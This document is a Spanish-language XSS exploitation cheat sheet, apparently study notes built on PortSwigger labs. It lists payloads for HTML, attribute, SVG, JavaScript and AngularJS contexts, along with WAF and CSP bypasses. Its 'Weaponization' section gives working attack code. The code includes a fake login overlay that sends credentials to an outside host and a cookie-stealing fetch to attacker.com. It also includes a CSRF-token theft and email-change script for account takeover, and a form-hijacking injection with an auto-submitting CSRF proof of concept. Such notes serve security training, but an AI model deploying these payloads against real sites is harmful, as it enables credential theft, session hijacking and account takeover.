
Tags: #WebSecurity #Pentesting #XSS #Payloads #WAFBypass #PortSwigger

---

## 📑 Índice

1. [[#1. Fundamentos Teóricos (Sources & Sinks)]]
    
2. [[#2. Fase de Descubrimiento (Fuzzing & Contexto)]]
    
3. [[#3. Inyección en Contexto HTML (Tags & Custom)]]
    
4. [[#4. Inyección en Atributos y Eventos (Auto-Execution)]]
    
5. [[#5. Vectores SVG y XML (Animation & Href Bypass)]]
    
6. [[#6. Inyección en Contexto JavaScript (Avanzado)]]
    
7. [[#7. Client-Side Template Injection (AngularJS)]]
    
8. [[#8. Bypass de WAF y Sanitización]]
    
9. [[#9. Bypass de CSP (Content Security Policy)]]
    
10. [[#10. Weaponization: Del XSS al Impacto Crítico]]
	
11. [[#Referencias]]

---

> [!INFO] Payloads
> 
> - Los Payloads son genéricos y en la mayoria de los casos necesitan adaptarse a la lógica de la web víctima.
>   

## 1. Fundamentos Teóricos (Sources & Sinks)

Para entender cómo romper la lógica, debemos identificar el flujo de datos.

> [!INFO] Conceptos Clave
> 
> - **Source (Fuente):** El origen del dato no confiable bajo control del atacante (ej: `location.search`, `document.referrer`, `cookies`, inputs de formularios).
>     
> - **Sink (Sumidero):** La función o elemento del DOM que procesa ese dato de forma insegura, permitiendo la ejecución de script.
>     

### Tabla de Sinks Comunes

| **Contexto**          | **Sinks Peligrosos**                                               | **Riesgo**                            |
| --------------------- | ------------------------------------------------------------------ | ------------------------------------- |
| **Ejecución Directa** | `eval()`, `setTimeout()`, `setInterval()`, `Function()`            | Crítico (RCE en JS)                   |
| **DOM HTML**          | `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()` | XSS Reflejado/DOM                     |
| **Navegación**        | `location`, `location.href`, `location.replace()`, `window.open()` | Redirección / `javascript:` execution |
| **JQuery**            | `$('#target').html()`, `$.parseHTML()`                             | XSS Clásico                           |

---

## 2. Fase de Descubrimiento (Fuzzing & Contexto)

Antes de lanzar payloads complejos, debemos entender qué caracteres permite el filtro.

### Fuzzing de Tags y Eventos

Usamos **Burp Suite Intruder** o **Wfuzz** para identificar qué tags HTML o atributos de eventos no están bloqueados.

Herramienta: PortSwigger XSS Cheat Sheet.

Objetivo: Encontrar un tag (ej: `<details>`) y un evento (ej: ontoggle) que el WAF permita.

Comando Wfuzz para Contexto JS:

Si sospechamos que la inyección está dentro de un string de JS, usamos este comando para ver qué caracteres rompen la sintaxis o se reflejan:

```bash
# Wordlist recomendada: SecLists/Fuzzing/special-chars.txt
wfuzz -u "https://target.com/post?postId=3FUZZ%27},{x=%27" -w special-chars.txt --hc 404,403
```

- **Lógica:** Buscamos cambios en el `Content-Length` o códigos de estado que indiquen que nuestro carácter fue interpretado (ej: romper un string con `'` suele causar errores 500 o respuestas distintas).
    

---

## 3. Inyección en Contexto HTML (Tags & Custom)

### Payloads Básicos


```html
<img src=0 onerror=alert(9)>

<img/src=0/onerror=alert(1)>
```

### Custom Tags (Etiquetas Personalizadas)

Los navegadores modernos permiten definir etiquetas personalizadas. Los WAFs a menudo buscan `<script>` o `<img>` pero ignoran `<xss>`.


```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

- **Explicación:** Creamos una etiqueta `<xss>`. El `tabindex=1` la hace "enfocable". Si añadimos `#x` al final de la URL, el navegador intentará hacer foco en el elemento, disparando `onfocus`.
    

### Hidden Link & AccessKey (Canonical Exploitation)

Una técnica sigilosa donde inyectamos en etiquetas `<link>` del `head`.

**Escenario Vulnerable:**


```html
<link rel="canonical" href='https://target.com/?x=INYECCION'/>
```

Payload:

?%27accesskey='x'onclick='alert(1)

Resultado:

```html
<link rel="canonical" href='https://target.com/?x='accesskey='x'onclick='alert(1)'/>
```

- **Lógica:** El atributo `accesskey` define un atajo de teclado (Windows: `ALT+SHIFT+X`, Mac: `CTRL+ALT+X`). Aunque el elemento no sea visible, el evento `onclick` se dispara al presionar la combinación. Es útil cuando no podemos inyectar tags nuevos, solo atributos.
    

---

## 4. Inyección en Atributos y Eventos (Auto-Execution)

El objetivo es lograr la ejecución sin interacción consciente del usuario ("Zero-Click" o interacción forzada).

### Iframe + OnLoad + Resize (Interacción Forzada)

Técnica para obligar al navegador a ejecutar el evento `onresize` automáticamente.

```html
<iframe src="url" onload='this.src + "<script>..."'>
```

**Payload Avanzado (Auto-Resize):**

```html
<p id="conelid" tabindex="true" onfocus="alert(1)">Texto Invisible</p>
<script>
    // Forzamos un resize o focus automático
    window.location.hash = "conelid"; 
</script>
```

**Variante de PortSwigger (OnResize):**

1. Inyectamos un payload que espera un evento `onresize`.
    
2. Nuestro script externo carga la página vulnerable en un iframe.
    
3. El script cambia el tamaño del iframe (`width`).
    
4. El navegador detecta el cambio de tamaño dentro del iframe y dispara el XSS.
    

### Técnica de Focus Automático (Tabindex)

**Lógica Vulnerable:** Un elemento como `<p>` o `<div>` normalmente no dispara eventos de foco. El atributo `tabindex` le indica al navegador "este elemento puede ser seleccionado con la tecla TAB".

1. **Inyección:** `<p id="triger" tabindex="1" onfocus="alert(1)"></p>`
    
2. **Trigger:** Añadimos `/#trigger` a la URL. El navegador hace scroll y foco automáticamente al cargar.
    

---

## 5. Vectores SVG y XML (Animation & Href Bypass)

SVG (Scalable Vector Graphics) es XML, lo que permite namespaces y comportamientos diferentes al HTML estándar.

### SVG Animation (Bypass de eventos bloqueados)

Si `onload` está bloqueado, usamos animaciones que inician automáticamente.


```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

- **Lógica:** `onbegin` se dispara en cuanto la animación (que no hace nada visualmente) comienza.
    

### Bypass de Href Bloqueado (Protocolo Javascript)

Si el filtro sanitiza `<a href="javascript:...">` en HTML, podemos intentarlo dentro de un SVG, ya que maneja los enlaces de forma distinta o permite animar el valor del `href`.

**Payload:**


```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" />
    <text x="20" y="20" fill="black">Click</text>
  </a>
</svg>
```

- **Lógica:** No definimos el `href` inicialmente. Usamos `<animate>` para establecer el valor del atributo `href` dinámicamente a `javascript:alert(1)`. El WAF estático no ve el protocolo malicioso en el atributo inicial.
    

---

## 6. Inyección en Contexto JavaScript (Avanzado)

Uno de los contextos más difíciles. Ocurre dentro de bloques `<script>`.

### Inyección en Fetch (Rompiendo Objetos JS)

**Escenario:**

```javascript
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3'}).finally(_ => window.location = '/')">
```

El input se refleja dentro del string `body`.

Payload (URL Encoded):

`postId=3&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window%2b'',{x:'`

**Desglose de la Lógica Vulnerable:**

1. `&'}`: Cierra el string y el objeto de configuración del fetch original.
    
2. `,x=x=>{throw/**/onerror=alert,1337}`:
    
    - Define una función `x`.
        
    - `throw` genera un error intencional.
        
    - `onerror=alert` captura ese error y ejecuta alert.
        
3. `,toString=x`: Sobrescribe la función `toString` del objeto actual para que apunte a nuestra función maliciosa `x`.
    
4. `,window%2b''`: Intentamos sumar `window` + un string vacío. JS intenta convertir el objeto `window` a string. Esto llama automáticamente a `toString()`, que ahora es nuestra función bomba.
    
5. `,{x:'`: Abre un nuevo objeto para que el resto del código original (`}).finally...`) no cause un error de sintaxis (SyntaxError) y detenga la ejecución.
    

---

## 7. Client-Side Template Injection (AngularJS)

Explotación de frameworks antiguos (Angular 1.x) que evalúan expresiones en el lado del cliente.

### Sandbox Escape (Angular 1.4.4 - Sin Strings)

Angular tiene un "Sandbox" para evitar que accedas a window o document desde una expresión {{ }}.

Debemos escapar usando prototipos.

Payload:

```js
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

**Lógica del Exploit:**

1. `toString().constructor.prototype`: Accedemos al prototipo de String.
    
2. `charAt=[].join`: Sobrescribimos `charAt`. Esto rompe la validación interna del sandbox de Angular.
    
3. `[1,2]|orderBy:...`: Usamos el filtro `orderBy`, que evalúa expresiones.
    
4. `fromCharCode(...)`: Generamos el string `x=alert(1)` sin usar comillas (que podrían estar filtradas), usando códigos ASCII.
    

### CSP Bypass con Angular (NG-Focus)

Si hay un CSP estricto (`script-src 'self'`) pero se carga Angular, podemos usar Angular para ejecutar código "confiable".

**Payload:**

```JavaScript
<script>
  location = 'https://target.com/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x';
</script>
```

- **Mecánica:** Inyectamos HTML. Angular procesa `ng-focus`. Al añadir `#x` a la URL, se fuerza el foco. `orderBy` evalúa nuestra alerta. Como la ejecución la hace Angular (que es un script permitido por el CSP), el navegador lo permite.
    

---

## 8. Bypass de WAF y Sanitización

Técnicas para evadir filtros de caracteres específicos.

### Tabla de Evasión y Codificación

|**Técnica**|**Payload Original**|**Payload Evasivo**|**Explicación**|
|---|---|---|---|
|**Comillas Escapadas**|`';alert(1)//`|`\';alert(1)//`|Si el servidor escapa `'` a `\'`, inyectamos `\` para que sea `\\'` (la barra se escapa a sí misma y la comilla queda libre).|
|**HTML Entities**|`alert(1)`|`&lpar;1&rpar;`|Útil si `<` o `>` están bloqueados pero se decodifican en el sink.|
|**Unicode Escapes**|`alert(1)`|`\u0061lert(1)`|Funciona dentro de contexto JS (eval, setTimeout, etc).|
|**Template Strings**|`alert(1)`|`${alert(1)}`|JS moderno (backticks). Útil si `()` están bloqueados en ciertos contextos.|

Ejemplo Unicode en InnerText:

Si el sink es innerText y usa un framework reactivo:

Payload: ${alert(0)} (A veces interpretado como expresión).

---

## 9. Bypass de CSP (Content Security Policy)

### Policy Injection

Si el parámetro inyectado se refleja en la cabecera de respuesta HTTP.

- Escenario:

URL: /?token=123

Response Header: Content-Security-Policy: report-uri /rep?token=123

- Ataque:

Inyectamos ; para terminar la directiva actual y añadimos una nueva permisiva.

- Payload:

`&token=;script-src-elem 'unsafe-inline'`

Resultado en Header:

... report-uri /rep?token=;script-src-elem 'unsafe-inline'

Esto habilita scripts en línea (<script>alert(1)</script>).

---

## 10. Weaponization: Del XSS al Impacto Crítico

Aquí transformamos una simple alerta en un ataque real.

### 1. Robo de Credenciales (Phishing Overlay)

Inyectamos un formulario falso sobre la página legítima. Como estamos en el dominio real, el usuario confía.

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  <h3>Sesión caducada. Por favor, logueate de nuevo:</h3>
  <input name=username placeholder="Usuario" onchange=fetch("https://oastify.com/?u="+this.value)>
  <input type=password name=password placeholder="Contraseña" onchange=fetch("https://oastify.com/?p="+this.value)>
</div>
```

### 2. Robo de Sesión (Cookies)

```JavaScript
<script>
fetch("https://attacker.com/?cookie="+btoa(document.cookie));
</script>
```

### 3. CSRF Extremo: Cambio de Email (Account Takeover)

Esta técnica combina XSS para saltarse la protección anti-CSRF.

**Escenario:** Queremos cambiar el email de la víctima, pero hay un token CSRF oculto.

Script de Explotación (Payload JavaScript):

Este script debe ser minificado y entregado vía XSS (ej: eval(atob('BASE64...'))).

```JavaScript
<script>
// 1. Fase de Reconocimiento: Obtener el token CSRF legítimo
var req1 = new XMLHttpRequest();
// "false" hace la petición Síncrona (espera a que termine para seguir)
req1.open("GET", "/my-account", false); 
req1.send();

// Parseamos la respuesta HTML para encontrar el token
var parser = new DOMParser();
var doc = parser.parseFromString(req1.responseText, 'text/html');
// Selector CSS para extraer el value del input hidden
var csrfToken = doc.querySelector('input[name="csrf"]').value;

// 2. Exfiltrar el token (Opcional, para debug en Burp Collaborator)
var req2 = new XMLHttpRequest();
req2.open("GET", "https://collab.oastify.com/?token=" + csrfToken);
req2.send();

// 3. Fase de Explotación: Lanzar la petición POST forzada
var req3 = new XMLHttpRequest();
req3.open("POST", "/my-account/change-email", false);
// Header indispensable para formularios estándar
req3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// Construimos el cuerpo con el email del atacante y el token robado
var data = "email=hacker%40evil.com&csrf=" + csrfToken;
req3.send(data);
</script>
```

### 4. CSRF vía HTML Injection (Form Hijacking)

Si no podemos ejecutar JS complejo pero sí inyectar HTML, rompemos el formulario legítimo para capturar el token cuando el usuario haga clic.

Paso 1: Inyección (Link enviado a la víctima)

Inyectamos un cierre de form </form> y abrimos uno nuevo hacia nuestro servidor.

```JavaScript
// El navegador renderiza el input hidden del token CSRF, pero ahora pertenece a NUESTRO form.
location='https://target.com/my-account?email=a"></form><form action="https://evil-server.net/exploit" method="GET"><button type="submit">Click me</button>';
```

Paso 2: Explotación (En nuestro servidor)

Cuando la víctima envía el form, recibimos su token CSRF. Usamos Burp Suite "Generate CSRF PoC" para usar ese token automáticamente:

```html
<html>
  <body>
    <form action="https://target.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="TOKEN_ROBADO" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/'); // Oculta la URL para ser sigiloso
      document.forms[0].submit();     // Envío automático
    </script>
  </body>
</html>
```

---
# Referencias:

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
- [XSS Cheat Sheet Portswiger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.4.0---1.4.9)